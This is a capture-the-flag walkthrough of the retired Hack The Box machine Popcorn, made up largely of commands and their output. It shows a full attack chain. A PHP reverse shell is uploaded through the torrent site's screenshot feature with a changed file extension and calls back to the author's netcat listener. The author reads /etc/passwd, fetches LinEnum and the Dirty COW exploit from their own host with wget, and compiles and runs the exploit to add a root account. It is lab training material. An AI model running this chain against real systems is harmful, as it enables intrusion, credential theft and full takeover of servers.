![](boxInfo.png)

nmap -sC -sV 10.10.10.6
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 10:19 India Standard Time
Nmap scan report for 10.10.10.6
Host is up (0.25s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.28 seconds
```

/root/go/bin/gobuster dir -u 10.10.10.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
```
/index (Status: 200)
/index.html (Status: 200)
/test (Status: 200)
/test.php (Status: 200)
/torrent (Status: 301)
/rename (Status: 301)
```

the /torrent/ page has a signup and upload functionality so we can register and try to upload a php reverse shell  
we can only upload torrent files but we can also upload a screenshot image with it so i uploaded the php reverse shell as the screenshot  
found a torrent file from kali linux downloads page  
```
root@kali:~/Desktop/hackTheBox.eu/retiredMachine/Linux/Popcorn# locate shell.php
/usr/share/beef-xss/modules/exploits/m0n0wall/php-reverse-shell.php
/usr/share/laudanum/php/php-reverse-shell.php
/usr/share/laudanum/php/shell.php
/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
/usr/share/laudanum/wordpress/templates/shell.php
/usr/share/webshells/php/php-reverse-shell.php
/usr/share/webshells/php/findsocket/php-findsock-shell.php

root@kali:~/Desktop/hackTheBox.eu/retiredMachine/Linux/Popcorn# cp /usr/share/laudanum/php/php-reverse-shell.php .

root@kali:~/Desktop/hackTheBox.eu/retiredMachine/Linux/Popcorn# mv php-reverse-shell.php php-reverse-shell.php.jpg

root@kali:~/Desktop/hackTheBox.eu/retiredMachine/Linux/Popcorn# ls
kali-linux-2020.1-installer-netinst-amd64.iso.torrent  Popcorn.pdf
php-reverse-shell.php.jpg                              solution.md
```
after uploading the torrent file click on 'edit this torrent' to upload a screenshot  
it only accepts images so after changing the extension it was accepted but we want the php extension for it to get us a shell  
so we intercept the requests in burp and change the extension of the php-reverse-shell from jpg to php (before uploading the file don't forget to change the ip address to your machine's ip address)  

**rather than changing the extension by this clever way of intercepting the request in burp we can also use /rename**
```
http://10.10.10.6/rename/index.php?filename=/var/www/torrent/upload/0268093e046d13a58da18116106aa429d648d421.gif&newfilename=/var/www/torrent/upload/shell.php
```

after uploading the php-reverse-shell successfully with php extension, start listening on the port mentioned in the uploaded file and then visited /torrent/upload and click on the php file to get reverse shell  
```
root@kali:~# nc -nlvp 1234                                                                                                                                                                                  [12/12]
listening on [any] 1234 ...                                                                                                                                                                                        
connect to [10.10.14.57] from (UNKNOWN) [10.10.10.6] 54964                                                                                                                                                         
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux                                                                                                                     
 08:51:44 up  5:27,  0 users,  load average: 0.00, 0.00, 0.00                                                                                                                                                      
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT                                                                                                                                               
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                                                                              
/bin/sh: can't access tty; job control turned off                                                                                                                                                                  
$ ls                                                                                                                                                                                                               
bin                                                                                                                                                                                                                
boot                                                                                                                                                                                                               
cdrom                                                                                                                                                                                                              
dev                                                                                                                                                                                                                
etc
home
initrd.img
lib
lost+found
media
mnt
opt
proc
root
sbin
selinux
srv
sys
tmp
usr
var
vmlinuz
$ whoami
www-data
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
landscape:x:102:105::/var/lib/landscape:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
george:x:1000:1000:George Papagiannopoulos,,,:/home/george:/bin/bash
mysql:x:104:113:MySQL Server,,,:/var/lib/mysql:/bin/false
$ ls /home
george
$ ls /home/george
torrenthoster.zip
user.txt
$ cat /home/george/user.txt
5e36a919398ecc5d5c110f2d865cf136
```

to get a proper shell with auto-complete, ability to clear screen use these commands
```
python -c "import pty;pty.spawn('/bin/bash')"
ctrl+Z (to background)
stty raw -echo && fg
export TERM=xterm
```

now that we got user.txt we should try for privilege escalation  
so start a python http server in /opt/privEsc/LinEnum directory and wget the LinEnum.sh file in the shell that we got above  
```
root@kali:/opt/privEsc/LinEnum# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
$ python -c "import pty; pty.spawn('/bin/bash');"                                                                                                                                                                  
www-data@popcorn:/var/www/rename$ cd /tmp
cd /tmp
www-data@popcorn:/tmp$ ls
ls
www-data@popcorn:/tmp$ wget http://10.10.14.57:8000/LinEnum.sh
wget http://10.10.14.57:8000/LinEnum.sh
--2020-03-13 09:14:02--  http://10.10.14.57:8000/LinEnum.sh
Connecting to 10.10.14.57:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: `LinEnum.sh'

100%[======================================>] 46,631      57.0K/s   in 0.8s    

2020-03-13 09:14:03 (57.0 KB/s) - `LinEnum.sh' saved [46631/46631]

www-data@popcorn:/tmp$ ls
ls
LinEnum.sh
```

now we can just run LinEnum.sh and analyse the output
```
www-data@popcorn:/tmp$ ./LinEnum.sh                                                                                                                                                                                
./LinEnum.sh                                                                                                                                                                                                       
                                                                                                                                                                                                                   
#########################################################                                                                                                                                                          
# Local Linux Enumeration & Privilege Escalation Script #                                                                                                                                                          
#########################################################                                                                                                                                                          
# www.rebootuser.com                                                                                                                                                                                               
# version 0.982                                                                                                                                                                                                    
                                                                                                                                                                                                                   
[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Fri Mar 13 09:14:33 EET 2020


### SYSTEM ##############################################
[-] Kernel information:
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux


[-] Kernel information (continued):
Linux version 2.6.31-14-generic-pae (buildd@rothera) (gcc version 4.4.1 (Ubuntu 4.4.1-4ubuntu8) ) #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=9.10
DISTRIB_CODENAME=karmic
DISTRIB_DESCRIPTION="Ubuntu 9.10"


[-] Hostname:
popcorn
```
there was a lot more info but here i have only included the SYSTEM info  
we can start by searching for exploits for this kernel version  
so i searched for "Linux popcorn 2.6.31-14 exploit"  
got this privEsc result "https://www.exploit-db.com/exploits/40839" ==> "Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)"  
so i downloaded the c file into the shell, compiled and ran it as given in the comment in file  
```
www-data@popcorn:/tmp$ wget http://10.10.14.57/40839.c
wget http://10.10.14.57/40839.c
--2020-03-13 09:36:16--  http://10.10.14.57/40839.c
Connecting to 10.10.14.57:80... failed: Connection refused.
www-data@popcorn:/tmp$ wget http://10.10.14.57:8000/40839.c
wget http://10.10.14.57:8000/40839.c
--2020-03-13 09:36:38--  http://10.10.14.57:8000/40839.c
Connecting to 10.10.14.57:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5006 (4.9K) [text/plain]
Saving to: `40839.c'

100%[======================================>] 5,006       --.-K/s   in 0.1s    

2020-03-13 09:36:39 (51.2 KB/s) - `40839.c' saved [5006/5006]

www-data@popcorn:/tmp$ ls
ls
40839.c  LinEnum.sh
www-data@popcorn:/tmp$ gcc -pthread 40839.c -o dirty -lcrypt
gcc -pthread 40839.c -o dirty -lcrypt
www-data@popcorn:/tmp$ ls
ls
40839.c  LinEnum.sh  dirty
www-data@popcorn:/tmp$ ./dirty
./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: qwerty

Complete line:
firefart:fiDBsH4uAQ9kk:0:0:pwned:/root:/bin/bash

mmap: b783a000
```

now that we have ran the privEsc code successfully, it has added firefart as root with password "qwerty"  
so we can just ssh as firefart  
```
root@kali:~# ssh firefart@10.10.10.6
firefart@10.10.10.6's password: 
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/

  System information as of Fri Mar 13 09:48:21 EET 2020

  System load: 3.75              Memory usage: 15%   Processes:       122
  Usage of /:  6.9% of 14.80GB   Swap usage:   0%    Users logged in: 0

  Graph this data and manage this system at https://landscape.canonical.com/

Last login: Sun Sep 24 18:01:48 2017
firefart@popcorn:~# whoami
firefart

firefart@popcorn:~# cat /root/root.txt 
f122331023a9393319a0370129fd9b14

firefart@popcorn:~# cat /etc/passwd
firefart:fiDBsH4uAQ9kk:0:0:pwned:/root:/bin/bash
/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
landscape:x:102:105::/var/lib/landscape:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
george:x:1000:1000:George Papagiannopoulos,,,:/home/george:/bin/bash
mysql:x:104:113:MySQL Server,,,:/var/lib/mysql:/bin/false
```


